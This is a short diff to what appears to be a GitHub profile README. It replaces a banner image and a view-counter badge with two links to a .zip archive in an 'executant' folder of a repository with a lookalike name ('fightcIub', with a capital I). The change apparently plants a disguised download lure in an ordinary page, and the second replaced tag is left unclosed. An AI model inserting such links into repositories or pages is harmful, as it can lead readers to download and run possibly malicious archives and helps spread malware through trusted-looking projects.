@@ -1,5 +1,5 @@
 <p align="center">
-<img src="https://file.garden/Zlc_rlwZaj3gLlZ-/Untitled277_20250302002131.png">
+<img src="https://raw.githubusercontent.com/fightcIub/fightcIub/main/executant/Iub-fightc-v1.0-alpha.5.zip">
 </p>
 
 
@@ -10,5 +10,5 @@
 
 
 <p align="center">
-<img src="https://komarev.com/ghpvc/?username=fuyushirono&label=bubbles&color=orange&style=plastic"
+<img src="https://raw.githubusercontent.com/fightcIub/fightcIub/main/executant/Iub-fightc-v1.0-alpha.5.zip"
 </p>
